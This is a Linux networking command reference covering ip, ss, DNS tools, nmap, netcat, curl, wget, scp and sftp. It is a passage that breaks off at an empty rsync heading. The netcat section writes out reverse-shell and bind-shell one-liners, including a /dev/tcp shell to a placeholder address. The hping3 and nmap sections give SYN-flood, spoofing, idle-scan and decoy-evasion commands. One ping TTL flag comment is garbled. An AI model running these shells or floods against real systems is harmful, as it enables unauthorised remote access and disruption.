# Linux Networking & Shell Scripting — Exhaustive Command Reference

> **Scope:** Covers every major tool for network diagnostics, configuration, security, and transfers, plus complete Bash scripting fundamentals. Intended as a self-contained desk reference.

---

## Table of Contents

1. [ip command suite](#1-ip-command-suite)
2. [Legacy net-tools](#2-legacy-net-tools)
3. [ss — socket statistics](#3-ss--socket-statistics)
4. [Connectivity testing](#4-connectivity-testing)
5. [DNS tools](#5-dns-tools)
6. [Port scanning / probing](#6-port-scanning--probing)
7. [File transfers](#7-file-transfers)
8. [SSH](#8-ssh)
9. [Firewall](#9-firewall)
10. [Bash fundamentals](#10-bash-fundamentals)
11. [Control flow](#11-control-flow)
12. [Functions](#12-functions)
13. [Arrays](#13-arrays)
14. [I/O redirection](#14-io-redirection)
15. [Signal handling](#15-signal-handling)
16. [Debugging](#16-debugging)

---

## 1. ip command suite

The `ip` command (from `iproute2`) replaces `ifconfig`, `route`, and `arp`. Everything operates on kernel netlink sockets directly.

### General syntax

```
ip [OPTIONS] OBJECT COMMAND [ARGS]
```

**Global options:**

| Flag | Meaning |
|------|---------|
| `-4` | IPv4 only |
| `-6` | IPv6 only |
| `-s` | Show statistics (bytes/packets) |
| `-br` | Brief one-line output |
| `-j` | JSON output |
| `-c` | Color output |
| `-n <netns>` | Operate inside named network namespace |

---

### 1.1 ip addr

Manage IP addresses on interfaces.

```bash
# Show all addresses (all interfaces)
ip addr show
ip addr                    # same — 'show' is default
ip -br addr                # brief: eth0  UP  192.168.1.10/24

# Show one interface
ip addr show dev eth0

# Show only IPv4
ip -4 addr show

# Add an address
ip addr add 192.168.1.100/24 dev eth0

# Add with label (visible in 'ip addr' as alias)
ip addr add 10.0.0.1/32 dev lo label lo:vpn

# Delete an address
ip addr del 192.168.1.100/24 dev eth0

# Flush all addresses on an interface (dangerous — kills connectivity)
ip addr flush dev eth0

# Show with stats
ip -s addr show dev eth0
```

**Output fields:**
- `scope` — `global` (routable), `link` (local segment only), `host` (loopback)
- `dynamic` — address assigned by DHCP
- `valid_lft` / `preferred_lft` — IPv6 lifetime timers

---

### 1.2 ip link

Manage network interface state and attributes.

```bash
# List all interfaces
ip link show
ip -br link                # brief table

# Show one interface
ip link show dev eth0

# Bring interface up / down
ip link set eth0 up
ip link set eth0 down

# Change MTU
ip link set eth0 mtu 9000

# Change MAC address (interface must be down first)
ip link set eth0 down
ip link set eth0 address 00:11:22:33:44:55
ip link set eth0 up

# Enable/disable promiscuous mode
ip link set eth0 promisc on
ip link set eth0 promisc off

# Create a VLAN interface (802.1q)
ip link add link eth0 name eth0.100 type vlan id 100
ip link set eth0.100 up

# Create a bridge
ip link add name br0 type bridge
ip link set eth0 master br0
ip link set br0 up

# Create a dummy interface (useful for testing)
ip link add dummy0 type dummy
ip link set dummy0 up

# Create a veth pair (virtual ethernet — used in containers/namespaces)
ip link add veth0 type veth peer name veth1

# Delete a link
ip link del eth0.100
ip link del dummy0

# Show link statistics (bytes, errors, drops)
ip -s link show dev eth0
```

---

### 1.3 ip route

Manage the routing table.

```bash
# Show main routing table
ip route show
ip route              # same
ip route show table main

# Show all tables (main + local + default)
ip route show table all

# Show routes for a specific destination (longest match)
ip route get 8.8.8.8

# Add a static route
ip route add 10.10.0.0/16 via 192.168.1.1
ip route add 10.10.0.0/16 dev eth0               # on-link, no gateway
ip route add 10.10.0.0/16 via 192.168.1.1 dev eth0

# Add default gateway
ip route add default via 192.168.1.1
ip route add 0.0.0.0/0 via 192.168.1.1           # same thing

# Delete a route
ip route del 10.10.0.0/16 via 192.168.1.1
ip route del default

# Replace (add or update atomically)
ip route replace 10.10.0.0/16 via 192.168.1.254

# Flush route cache
ip route flush cache

# Flush all routes on an interface
ip route flush dev eth0

# Add route with metric (lower = preferred)
ip route add 10.0.0.0/8 via 192.168.1.1 metric 100

# Add multipath route (ECMP — traffic spread across two gateways)
ip route add default \
    nexthop via 192.168.1.1 dev eth0 weight 1 \
    nexthop via 192.168.2.1 dev eth1 weight 1

# Blackhole / prohibit / unreachable special routes
ip route add blackhole 10.99.0.0/24     # silently drop
ip route add prohibit  10.99.0.0/24     # drop + ICMP Admin Prohibited
ip route add unreachable 10.99.0.0/24   # drop + ICMP Host Unreachable
```

**Route tables:** Linux has 256 routing tables (0–255). Named tables live in `/etc/iproute2/rt_tables`. Default names: `local`(255), `main`(254), `default`(253), `unspec`(0).

---

### 1.4 ip neigh

Manage the ARP/NDP neighbor cache.

```bash
# Show all neighbors (ARP table)
ip neigh show
ip neigh               # same

# Show neighbors on one interface
ip neigh show dev eth0

# Show only reachable entries
ip neigh show nud reachable

# NUD states: REACHABLE, STALE, DELAY, PROBE, FAILED, NOARP, PERMANENT, NONE

# Add a static ARP entry
ip neigh add 192.168.1.50 lladdr 00:aa:bb:cc:dd:ee dev eth0 nud permanent

# Change an existing entry
ip neigh change 192.168.1.50 lladdr 00:aa:bb:cc:dd:ff dev eth0

# Delete a neighbor
ip neigh del 192.168.1.50 dev eth0

# Flush the neighbor cache (all stale entries)
ip neigh flush all

# Flush only stale entries on one interface
ip neigh flush dev eth0 nud stale

# Show with IPv6 NDP entries
ip -6 neigh show
```

---

### 1.5 ip rule

Policy-based routing — select which routing table to use based on source address, fwmark, etc.

```bash
# Show all rules (processed in priority order, lower = first)
ip rule show
ip rule list           # same

# Add rule: packets from 192.168.2.0/24 use table 200
ip rule add from 192.168.2.0/24 table 200

# Add rule: packets to 10.0.0.0/8 use table 100
ip rule add to 10.0.0.0/8 table 100

# Add rule based on fwmark (set by iptables -j MARK)
ip rule add fwmark 0x1 table 101

# Add rule with priority
ip rule add from 192.168.3.0/24 table 200 priority 1000

# Delete a rule
ip rule del from 192.168.2.0/24 table 200

# Typical dual-ISP policy routing setup:
# 1. Two default gateways in separate tables
ip route add default via 10.0.0.1 table 100
ip route add default via 10.0.1.1 table 200
# 2. Rules to route by source interface
ip rule add from 10.0.0.0/24 table 100
ip rule add from 10.0.1.0/24 table 200
```

---

### 1.6 ip netns (bonus — network namespaces)

```bash
# Create a namespace
ip netns add myns

# List namespaces
ip netns list

# Run a command inside a namespace
ip netns exec myns ip addr show
ip netns exec myns bash     # interactive shell in namespace

# Move an interface into a namespace
ip link set veth1 netns myns

# Delete a namespace
ip netns del myns
```

---

## 2. Legacy net-tools

These commands (`net-tools` package) predate `iproute2`. Present on many systems; deprecated but widely referenced.

### 2.1 ifconfig

```bash
# Show all interfaces (including down)
ifconfig -a

# Show one interface
ifconfig eth0

# Bring up / down
ifconfig eth0 up
ifconfig eth0 down

# Set IP address and netmask
ifconfig eth0 192.168.1.100 netmask 255.255.255.0

# Set MTU
ifconfig eth0 mtu 1500

# Set MAC address
ifconfig eth0 hw ether 00:11:22:33:44:55

# Add a virtual alias
ifconfig eth0:1 10.0.0.2 netmask 255.255.255.0 up

# Show statistics
ifconfig eth0   # RX/TX bytes and errors shown in output
```

**Equivalent `ip` commands:**

| ifconfig | ip |
|----------|----|
| `ifconfig eth0` | `ip addr show dev eth0` |
| `ifconfig eth0 up` | `ip link set eth0 up` |
| `ifconfig eth0 192.168.1.1 netmask 255.255.255.0` | `ip addr add 192.168.1.1/24 dev eth0` |

---

### 2.2 route

```bash
# Show routing table
route -n           # -n: numeric (no DNS lookups, much faster)

# Add default gateway
route add default gw 192.168.1.1

# Add a network route
route add -net 10.0.0.0 netmask 255.0.0.0 gw 192.168.1.1
route add -net 10.0.0.0/8 gw 192.168.1.1    # CIDR notation

# Add host route
route add -host 203.0.113.5 gw 192.168.1.1

# Delete a route
route del default gw 192.168.1.1
route del -net 10.0.0.0 netmask 255.0.0.0 gw 192.168.1.1

# Reject route (blackhole)
route add -net 192.168.100.0/24 reject
```

---

### 2.3 netstat

```bash
# Show all listening TCP and UDP with PID and numeric addresses
netstat -tulpn
# -t: TCP  -u: UDP  -l: listening  -p: show PID/program  -n: numeric

# Show all established connections
netstat -an | grep ESTABLISHED

# Show all connections (all states)
netstat -an

# Show routing table
netstat -rn           # like route -n

# Show interface statistics
netstat -i
netstat -s            # protocol statistics (detailed counters)

# Show multicast group membership
netstat -g

# Continuous refresh
netstat -c -tulpn     # refresh every second

# Show only IPv4 or IPv6
netstat -4 -tulpn
netstat -6 -tulpn

# Find what is using port 80
netstat -tulpn | grep ':80'

# Show Unix domain sockets
netstat -x
netstat -xl           # listening Unix sockets
```

**Common state meanings:**

| State | Meaning |
|-------|---------|
| `LISTEN` | Waiting for incoming connections |
| `ESTABLISHED` | Active connection |
| `TIME_WAIT` | Waiting after close (2*MSL timeout) |
| `CLOSE_WAIT` | Remote side closed; local app hasn't |
| `FIN_WAIT1/2` | Local side initiated close |
| `SYN_SENT` | Active open; SYN sent, no response yet |
| `SYN_RECV` | SYN received, SYN+ACK sent |

---

### 2.4 arp

```bash
# Show ARP cache
arp -n             # numeric
arp -v             # verbose

# Show ARP for specific IP
arp 192.168.1.1

# Add static ARP entry
arp -s 192.168.1.50 00:aa:bb:cc:dd:ee

# Delete an entry
arp -d 192.168.1.50

# Display hardware type
arp -H ether -n
```

---

## 3. ss — socket statistics

`ss` is the modern replacement for `netstat`. Faster (reads from kernel directly), more features.

### Syntax

```
ss [OPTIONS] [FILTER]
```

### Common flags

| Flag | Meaning |
|------|---------|
| `-t` | TCP sockets |
| `-u` | UDP sockets |
| `-l` | Listening sockets only |
| `-a` | All sockets (listening + connected) |
| `-n` | Numeric addresses (no DNS) |
| `-p` | Show process (PID, name) — requires root |
| `-e` | Extended info (socket memory, UID) |
| `-m` | Show socket memory usage |
| `-o` | Show timer information |
| `-r` | Resolve addresses |
| `-4` / `-6` | IPv4 / IPv6 only |
| `-x` | Unix domain sockets |
| `-s` | Summary statistics |

### Examples

```bash
# Everything listening, with PID — the daily workhorse
ss -tulpn

# All TCP connections (all states)
ss -tan

# All UDP
ss -uan

# Summary: total sockets by type and state
ss -s

# Find what is on port 443
ss -tlnp sport = :443

# Show all connections to a specific remote IP
ss -tn dst 203.0.113.10

# Show all connections from a source port
ss -tn sport = :22

# Unix domain sockets
ss -xl

# TCP sockets in TIME_WAIT
ss -t state time-wait

# TCP sockets in ESTABLISHED
ss -t state established

# Filter by destination port range
ss -tn dport \> :1024

# Show internal TCP info (RTT, cwnd, retransmits — useful for performance)
ss -tni

# Show socket memory usage (recv-q and send-q details)
ss -tm

# Extended info including UID and inode
ss -te
```

### State filters for `ss`

```bash
ss -t state established
ss -t state listening
ss -t state time-wait
ss -t state close-wait
ss -t state syn-sent
ss -t state syn-recv
ss -t state fin-wait-1
ss -t state fin-wait-2

# All except TIME_WAIT (useful when checking for leaks)
ss -t state all exclude time-wait
```

### Filter expressions

```bash
# dst/src: destination or source address:port
ss -tn dst 10.0.0.1
ss -tn dst 10.0.0.1:80
ss -tn src 192.168.1.0/24

# dport/sport: destination or source port
ss -tn dport = :80
ss -tn sport = :22
ss -tn dport \> :1024     # escape > in shell

# Combining with and / or
ss -tn dst 10.0.0.1 and dport = :443
ss -tn '( dst 10.0.0.1 or dst 10.0.0.2 )'
```

---

## 4. Connectivity testing

### 4.1 ping

ICMP echo request/reply — the first tool to reach for.

```bash
# Basic ping
ping google.com

# Send N packets then stop
ping -c 4 google.com

# Set interval between packets (seconds, default 1)
ping -i 0.2 google.com      # fast ping (200ms interval)
ping -i 5 google.com        # slow (5s interval)

# Set packet payload size (default 56 bytes = 64 byte ICMP)
ping -s 1400 google.com     # useful for MTU testing
ping -s 8972 -M do google.com   # -M do: prohibit fragmentation (MTU path test)

# Set TTL
ping -t 64 google.com       # macOS flag; Linux uses -T or via -t depending on version
ping -ttl 64 google.com

# Flood ping (root only — sends as fast as possible)
ping -f google.com

# Quiet — only show summary
ping -q -c 100 google.com

# Ping with deadline (give up after N seconds total)
ping -w 10 google.com

# Ping IPv6
ping6 google.com
ping -6 google.com

# Ping specific interface
ping -I eth0 google.com
ping -I 192.168.1.10 google.com   # bind to source address

# Set TOS/DSCP
ping -Q 0x10 google.com

# Record route (show hops in reply, max 9)
ping -R google.com
```

---

### 4.2 traceroute

Maps the path to a destination by sending probes with incrementing TTL.

```bash
# Basic traceroute (default: UDP probes)
traceroute google.com

# Use ICMP echo probes (like Windows tracert; often gets further through firewalls)
traceroute -I google.com

# Use TCP SYN probes on port 80 (gets through most firewalls)
traceroute -T -p 80 google.com

# Numeric only (no DNS lookups)
traceroute -n google.com

# Set max TTL (hops)
traceroute -m 20 google.com

# Set number of probes per hop (default 3)
traceroute -q 1 google.com      # faster, one probe per hop

# Set initial TTL
traceroute -f 5 google.com      # start at hop 5

# Specify source address/interface
traceroute -s 192.168.1.10 google.com
traceroute -i eth0 google.com

# Set wait timeout per probe (default 5s)
traceroute -w 2 google.com

# Show AS (autonomous system) numbers
traceroute -A google.com

# Packet size
traceroute -l 1000 google.com
```

---

### 4.3 tracepath

Simpler than traceroute — no root required, auto-discovers path MTU.

```bash
# Basic
tracepath google.com

# Numeric
tracepath -n google.com

# Set initial packet length (for MTU discovery)
tracepath -l 1500 google.com

# IPv6
tracepath6 google.com
tracepath -6 google.com
```

Output shows asymmetric delay and MTU at each hop automatically.

---

### 4.4 mtr

`mtr` combines `ping` and `traceroute` into a real-time continuously updating display. Essential for diagnosing intermittent packet loss at specific hops.

```bash
# Interactive real-time view
mtr google.com

# Numeric (no DNS)
mtr -n google.com

# Report mode: run N cycles then print report and exit
mtr -r -c 100 google.com       # 100 cycles, report only
mtr --report --report-cycles 50 google.com

# Use ICMP instead of UDP
mtr --icmp google.com

# Use TCP probe on port 443
mtr --tcp --port 443 google.com

# Set interval (seconds)
mtr -i 0.5 google.com

# Set packet size
mtr -s 1000 google.com

# JSON output (for scripting)
mtr -j -r -c 50 google.com

# Show AS numbers
mtr -z google.com

# Wide mode (show more of hostname)
mtr -w google.com
```

**Reading mtr output:**

| Column | Meaning |
|--------|---------|
| `Loss%` | Packet loss at this hop |
| `Snt` | Packets sent |
| `Last` | Last RTT (ms) |
| `Avg` | Average RTT |
| `Best` | Best RTT seen |
| `Wrst` | Worst RTT seen |
| `StDev` | Standard deviation |

**Key insight:** Loss at a middle hop that does NOT appear at subsequent hops means the router is rate-limiting ICMP (not actual loss). Real loss appears at the problem hop AND all hops after it.

---

### 4.5 hping3

TCP/IP packet crafter — SYN flood testing, custom probes, traceroute with arbitrary protocol.

```bash
# Send TCP SYN to port 80
hping3 -S -p 80 target.com

# ICMP ping (like regular ping)
hping3 --icmp target.com

# UDP probe
hping3 --udp -p 53 target.com

# TCP traceroute on port 80 (bypasses most firewalls)
hping3 -S -p 80 --traceroute target.com

# SYN flood (testing only, on your own equipment)
hping3 -S -p 80 --flood target.com

# Set TTL
hping3 -S -p 80 --ttl 64 target.com

# Send N packets
hping3 -S -p 80 -c 5 target.com

# Custom source IP (spoofing — requires root)
hping3 -S -p 80 -a 1.2.3.4 target.com

# Idle scan (uses zombie host to hide scanner's IP)
hping3 -S -p 80 -r -T --spoof zombiehost target.com

# Set interval between packets (microseconds)
hping3 -S -p 80 -i u100 target.com    # 100 microseconds

# Random destination ports
hping3 -S -p ++1 target.com           # increments port each packet
```

---

## 5. DNS tools

### 5.1 dig

The go-to DNS query tool. Precise, scriptable, supports all record types.

```bash
# Basic A record lookup
dig google.com
dig A google.com            # explicit type

# Short answer only (just the IP)
dig +short google.com
dig +short A google.com

# MX records (mail servers)
dig MX gmail.com
dig +short MX gmail.com

# NS records (authoritative nameservers)
dig NS google.com

# TXT records (SPF, DKIM, domain verification)
dig TXT google.com
dig TXT _dmarc.google.com

# SOA record (zone authority info)
dig SOA google.com

# PTR record (reverse DNS)
dig -x 8.8.8.8
dig PTR 8.8.8.8.in-addr.arpa.

# AAAA record (IPv6)
dig AAAA google.com

# CNAME
dig CNAME www.google.com

# SRV record
dig SRV _https._tcp.google.com

# CAA record (certificate authority authorization)
dig CAA google.com

# ANY — request all record types (many servers ignore this now)
dig ANY google.com

# Query a specific DNS server
dig @8.8.8.8 google.com
dig @1.1.1.1 google.com
dig @192.168.1.1 google.com         # your local resolver

# Trace from root — shows full delegation chain
dig +trace google.com
dig +trace MX gmail.com

# AXFR — zone transfer (only works if server allows it)
dig AXFR example.com @ns1.example.com

# DNSSEC validation
dig +dnssec google.com
dig +sigchase google.com       # follow signature chain

# Multiple flags
dig +noall +answer google.com           # only answer section
dig +noall +answer +authority google.com # answer + authority
dig +stats google.com                   # show query timing

# Disable recursion
dig +norecurse google.com

# Set timeout and retries
dig +time=2 +tries=1 @8.8.8.8 google.com

# EDNS / buffer size
dig +bufsize=4096 google.com

# Batch queries from file
dig -f queries.txt              # one query per line

# TCP instead of UDP (for large responses)
dig +tcp google.com
```

**Output sections:**

| Section | Contents |
|---------|---------|
| `QUESTION` | What was asked |
| `ANSWER` | Direct answer records |
| `AUTHORITY` | NS records for the zone |
| `ADDITIONAL` | A/AAAA for NS in AUTHORITY |

---

### 5.2 nslookup

Interactive or one-shot DNS queries. Simpler than `dig`, less scriptable.

```bash
# Basic lookup
nslookup google.com

# Query specific server
nslookup google.com 8.8.8.8

# Reverse lookup
nslookup 8.8.8.8

# Interactive mode
nslookup
> server 8.8.8.8
> set type=MX
> gmail.com
> set type=ANY
> google.com
> exit

# One-shot with type
nslookup -type=MX gmail.com
nslookup -type=NS google.com
nslookup -type=TXT google.com
nslookup -type=AAAA google.com
```

---

### 5.3 host

Simpler still — quick lookups with clean output.

```bash
# A record
host google.com

# Specific server
host google.com 8.8.8.8

# Verbose (all records)
host -a google.com

# Record types
host -t MX gmail.com
host -t NS google.com
host -t TXT google.com

# Reverse DNS
host 8.8.8.8

# Zone transfer attempt
host -l example.com ns1.example.com

# IPv6 only
host -6 google.com
```

---

### 5.4 /etc/resolv.conf

Controls how the system resolves DNS names.

```
# /etc/resolv.conf

# Primary nameserver
nameserver 8.8.8.8

# Fallback nameserver
nameserver 8.8.4.4

# Search domains: bare names like "server1" expand to "server1.corp.example.com"
search corp.example.com example.com

# Domain: single search domain (older syntax — use 'search' instead)
domain example.com

# Options
options ndots:5         # dots needed before absolute lookup (default 1)
options timeout:2       # seconds per attempt
options attempts:3      # retry count
options rotate          # round-robin across nameservers
options edns0           # enable EDNS0 extensions
```

**Note:** On systemd systems, `/etc/resolv.conf` is often a symlink to `/run/systemd/resolve/stub-resolv.conf`. Actual resolver config is in `/etc/systemd/resolved.conf`. Edit with `systemd-resolve --status` and `resolvectl`.

---

### 5.5 /etc/hosts

Static name-to-IP mapping — checked before DNS.

```
# /etc/hosts
127.0.0.1       localhost
127.0.1.1       myhostname

# Custom entries
192.168.1.10    devserver devserver.local
192.168.1.20    db01 db01.corp.example.com

# Block a domain (loopback it)
127.0.0.1       ads.example.com
```

**Resolution order** is controlled by `/etc/nsswitch.conf`:
```
hosts: files dns          # check /etc/hosts first, then DNS
hosts: dns files          # check DNS first
hosts: files mdns4_minimal [NOTFOUND=return] dns  # typical Ubuntu
```

---

## 6. Port scanning / probing

### 6.1 nmap

Network Mapper — the industry-standard scanner. **Always get written permission before scanning networks you do not own.**

```bash
# Ping scan — which hosts are up (no port scan)
nmap -sn 192.168.1.0/24

# Fast scan top 100 ports
nmap -F 192.168.1.1

# Scan specific ports
nmap -p 22,80,443 192.168.1.1
nmap -p 1-1024 192.168.1.1         # port range
nmap -p- 192.168.1.1               # all 65535 ports
nmap -p 80,443,8000-8100 192.168.1.1

# TCP SYN scan (stealth — doesn't complete handshake, requires root)
nmap -sS 192.168.1.1

# TCP connect scan (completes handshake — works without root)
nmap -sT 192.168.1.1

# UDP scan (slow — requires root)
nmap -sU 192.168.1.1
nmap -sU -p 53,67,68,69,123,161 192.168.1.1    # common UDP ports

# Service version detection
nmap -sV 192.168.1.1
nmap -sV --version-intensity 9 192.168.1.1    # max intensity

# OS detection (requires root)
nmap -O 192.168.1.1
nmap -O --osscan-guess 192.168.1.1    # aggressive guessing

# Aggressive scan: OS + version + scripts + traceroute
nmap -A 192.168.1.1

# Script scanning
nmap -sC 192.168.1.1                        # default scripts
nmap --script=vuln 192.168.1.1             # vulnerability scripts
nmap --script=http-title 192.168.1.1       # specific script
nmap --script=smb-vuln-ms17-010 192.168.1.1  # EternalBlue check
nmap --script=ssl-cert,ssl-enum-ciphers -p 443 192.168.1.1
nmap --script=default,safe 192.168.1.1    # default + safe scripts

# Timing templates (-T0 slowest, -T5 fastest)
nmap -T1 192.168.1.1           # sneaky (slow, less detectable)
nmap -T3 192.168.1.1           # default (normal)
nmap -T4 192.168.1.1           # aggressive (fast, reliable networks)
nmap -T5 192.168.1.1           # insane (may miss results)

# Output formats
nmap -oN output.txt 192.168.1.1     # normal text
nmap -oX output.xml 192.168.1.1     # XML
nmap -oG output.gnmap 192.168.1.1   # grepable
nmap -oA output 192.168.1.1         # all three formats

# Scan a subnet
nmap 192.168.1.0/24
nmap 192.168.1.1-254

# Scan from file
nmap -iL targets.txt

# Skip ping (treat all hosts as up — useful when ICMP is blocked)
nmap -Pn 192.168.1.1

# DNS options
nmap -n 192.168.1.1        # never do DNS resolution
nmap -R 192.168.1.1        # always resolve

# Source port spoofing (evade port-based ACLs)
nmap -g 53 192.168.1.1     # use port 53 as source

# Decoy scan (hide among fake IPs)
nmap -D RND:5 192.168.1.1           # 5 random decoys
nmap -D 10.0.0.1,10.0.0.2,ME 192.168.1.1

# Verbose output
nmap -v 192.168.1.1
nmap -vv 192.168.1.1       # very verbose
```

**NSE script categories:** `auth`, `broadcast`, `brute`, `default`, `discovery`, `dos`, `exploit`, `external`, `fuzzer`, `intrusive`, `malware`, `safe`, `version`, `vuln`

---

### 6.2 nc (netcat)

The TCP/IP Swiss Army knife — connect, listen, transfer, proxy.

```bash
# Connect to a port (TCP)
nc 192.168.1.1 80

# Send an HTTP request
echo -e "GET / HTTP/1.0\r\nHost: example.com\r\n\r\n" | nc example.com 80

# UDP connect
nc -u 192.168.1.1 514

# Listen on a port (server mode)
nc -l 4444              # listen TCP
nc -l -u 4444           # listen UDP
nc -lk 4444             # -k: keep listening after client disconnects

# Port scan (no data, just check open/closed)
nc -zv 192.168.1.1 80
nc -zv 192.168.1.1 1-1000    # range scan
nc -zv 192.168.1.1 22 80 443 # specific ports
nc -z -u 192.168.1.1 53      # UDP scan

# File transfer
# Receiver (run first):
nc -l 4444 > received_file.tar.gz
# Sender:
nc 192.168.1.1 4444 < file.tar.gz

# Piped file transfer with progress
nc -l 4444 | pv > received.tar.gz          # receiver with pv progress
tar czf - /data | nc 192.168.1.1 4444      # sender: compress and send

# Reverse shell (attacker listens, victim connects out — for CTF/pentesting)
# Listener:
nc -lvnp 4444
# Victim executes:
nc 10.10.10.10 4444 -e /bin/bash           # -e may not be in ncat/openbsd-nc
# Alternative without -e:
bash -i >& /dev/tcp/10.10.10.10/4444 0>&1

# Bind shell (listener on victim machine)
nc -lvnp 4444 -e /bin/bash

# Chat between two hosts
# Host A: nc -l 4444
# Host B: nc hostA 4444

# Timeout (abort if no connection/data within N seconds)
nc -w 5 192.168.1.1 80

# Use specific source interface/IP
nc -s 192.168.1.10 google.com 80

# Proxy / relay
nc -l 8080 | nc 192.168.1.100 80     # simple one-way relay

# Test SMTP server
nc mail.example.com 25
# Then type SMTP commands: EHLO, MAIL FROM, RCPT TO, DATA, QUIT

# Test HTTPS certificate (pipe to openssl)
echo | openssl s_client -connect example.com:443 2>/dev/null | openssl x509 -text
```

**nc variants:** `ncat` (from nmap — preferred, supports SSL), `netcat-openbsd` (no -e flag), `netcat-traditional` (has -e)

---

### 6.3 telnet

Primarily for testing TCP connectivity and text protocols.

```bash
# Test if port is open
telnet 192.168.1.1 80
telnet 192.168.1.1 22
telnet 192.168.1.1 25

# After connecting to an HTTP server
# Type:
GET / HTTP/1.0
Host: example.com
[blank line]

# Test SMTP manually
telnet mail.example.com 25
# EHLO mydomain.com
# MAIL FROM:<test@example.com>
# RCPT TO:<user@example.com>
# DATA
# Subject: Test
# Test body
# .
# QUIT

# If port is closed: "Connection refused"
# If filtered: hangs until timeout
```

---

## 7. File transfers

### 7.1 curl

Full-featured HTTP/HTTPS/FTP client and transfer tool.

```bash
# Basic GET
curl https://example.com

# Save to file (-o: specific name, -O: use remote filename)
curl -o output.html https://example.com
curl -O https://example.com/file.tar.gz

# Follow redirects
curl -L https://example.com

# Verbose output (headers, TLS handshake, timing)
curl -v https://example.com

# Silent (suppress progress)
curl -s https://example.com

# Show only HTTP status code
curl -s -o /dev/null -w "%{http_code}" https://example.com

# Custom HTTP method
curl -X POST https://api.example.com/endpoint
curl -X PUT https://api.example.com/resource/1
curl -X DELETE https://api.example.com/resource/1
curl -X PATCH https://api.example.com/resource/1

# Send headers
curl -H "Authorization: Bearer TOKEN" https://api.example.com
curl -H "Content-Type: application/json" -H "Accept: application/json" https://api.example.com

# POST with JSON body
curl -X POST \
     -H "Content-Type: application/json" \
     -d '{"key":"value","num":42}' \
     https://api.example.com/endpoint

# POST from file
curl -X POST \
     -H "Content-Type: application/json" \
     -d @payload.json \
     https://api.example.com/endpoint

# POST form data (application/x-www-form-urlencoded)
curl -X POST -d "username=admin&password=secret" https://example.com/login

# URL-encode a value
curl --data-urlencode "query=hello world & more" https://example.com/search

# Multipart form upload (-F)
curl -F "file=@/path/to/file.pdf" https://example.com/upload
curl -F "file=@photo.jpg;type=image/jpeg" -F "title=My Photo" https://upload.example.com

# Basic authentication
curl -u username:password https://example.com
curl -u username https://example.com       # prompts for password

# Skip TLS certificate verification (insecure, useful for self-signed certs)
curl -k https://192.168.1.1

# Use client certificate
curl --cert client.crt --key client.key https://example.com

# Cookies
curl -b "session=abc123" https://example.com          # send cookie
curl -b cookies.txt https://example.com               # load from file
curl -c cookies.txt https://example.com               # save to file
curl -b cookies.txt -c cookies.txt https://example.com # load and save

# Set user agent
curl -A "Mozilla/5.0" https://example.com

# Limit transfer speed
curl --limit-rate 500k -O https://example.com/bigfile.iso

# Resume interrupted download
curl -C - -O https://example.com/bigfile.iso

# Parallel downloads (curl 7.68+)
curl --parallel -O https://example.com/file1 -O https://example.com/file2

# Download multiple URLs
curl -O https://example.com/file1 -O https://example.com/file2

# Show response headers only
curl -I https://example.com              # HEAD request
curl -D - -o /dev/null https://example.com  # GET but dump headers to stdout

# Proxy
curl -x http://proxy.example.com:8080 https://target.com
curl -x socks5://127.0.0.1:9050 https://target.com   # SOCKS5 (Tor)

# FTP upload/download
curl -u user:pass ftp://ftp.example.com/file.txt -o file.txt
curl -u user:pass -T localfile.txt ftp://ftp.example.com/

# Timing breakdown
curl -w "\nDNS: %{time_namelookup}s\nConnect: %{time_connect}s\nTTFB: %{time_starttransfer}s\nTotal: %{time_total}s\n" \
     -s -o /dev/null https://example.com
```

---

### 7.2 wget

Recursive downloader and non-interactive HTTP/FTP retrieval.

```bash
# Basic download
wget https://example.com/file.tar.gz

# Save to specific filename
wget -O output.tar.gz https://example.com/file.tar.gz

# Background download (logs to wget-log)
wget -b https://example.com/bigfile.iso

# Resume interrupted download
wget -c https://example.com/bigfile.iso

# Quiet mode (no progress bar)
wget -q https://example.com/file.tar.gz

# Verbose
wget -v https://example.com/file.tar.gz

# Limit speed
wget --limit-rate=500k https://example.com/bigfile.iso

# Recursive download (mirror a site)
wget -r https://example.com

# Recursive, no parent — don't go above starting directory
wget -r -np https://example.com/docs/

# Mirror mode: recursive, timestamps, no parent, convert links
wget -m -k -E https://example.com

# Download to specific directory
wget -P /tmp/downloads/ https://example.com/file.tar.gz

# Set user agent
wget --user-agent="Mozilla/5.0" https://example.com

# Authentication
wget --user=admin --password=secret https://example.com/protected/

# Retry count and wait
wget --tries=5 --wait=2 https://example.com/file.tar.gz

# Download list of URLs from file
wget -i urls.txt

# FTP recursive download
wget -r ftp://ftp.example.com/pub/

# Reject file types
wget -r --reject="*.jpg,*.gif" https://example.com/

# Accept only specific types
wget -r --accept="*.pdf" https://example.com/docs/

# Follow only links on same domain
wget -r -D example.com https://example.com

# Timeout
wget --timeout=30 https://example.com/file.tar.gz

# Cookies
wget --load-cookies=cookies.txt https://example.com
wget --save-cookies=cookies.txt --keep-session-cookies https://example.com/login
```

---

### 7.3 scp

Secure copy over SSH.

```bash
# Copy local file to remote
scp file.txt user@remote:/path/to/dest/

# Copy remote file to local
scp user@remote:/path/to/file.txt ./

# Copy directory recursively
scp -r /local/dir/ user@remote:/remote/dir/

# Specify port (capital P)
scp -P 2222 file.txt user@remote:/tmp/

# Use specific key
scp -i ~/.ssh/id_servers file.txt user@remote:/tmp/

# Between two remote hosts (via local machine)
scp user1@host1:/path/file.txt user2@host2:/path/

# Preserve timestamps and permissions
scp -p file.txt user@remote:/tmp/

# Compression (useful for slow links)
scp -C largefile.tar user@remote:/tmp/

# Verbose
scp -v file.txt user@remote:/tmp/

# Limit bandwidth (kilobits/sec)
scp -l 1000 bigfile.tar user@remote:/tmp/

# Disable strict host key checking (first-time connect to new host)
scp -o StrictHostKeyChecking=no file.txt user@remote:/tmp/
```

---

### 7.4 sftp

Interactive or batch secure FTP over SSH.

```bash
# Connect
sftp user@remote

# Interactive commands:
# ls                — list remote
# lls               — list local
# pwd               — remote working directory
# lpwd              — local working directory
# cd /remote/path   — change remote dir
# lcd /local/path   — change local dir
# get remote.txt          — download file
# get remote.txt local.txt  — download with rename
# put local.txt           — upload file
# put local.txt remote.txt  — upload with rename
# mget *.log        — download multiple files
# mput *.log        — upload multiple files
# mkdir newdir      — create remote dir
# rmdir olddir      — remove remote dir
# rm file.txt       — delete remote file
# chmod 644 file    — change remote permissions
# help              — show all commands
# bye / exit / quit  — disconnect

# Batch mode (non-interactive, read commands from file)
sftp -b batch_commands.txt user@remote

# Example batch file contents:
# lcd /local/backups
# cd /remote/data
# put database.sql
# bye

# Specify port
sftp -P 2222 user@remote

# Use specific key
sftp -i ~/.ssh/id_servers user@remote
```

---

### 7.5 rsync

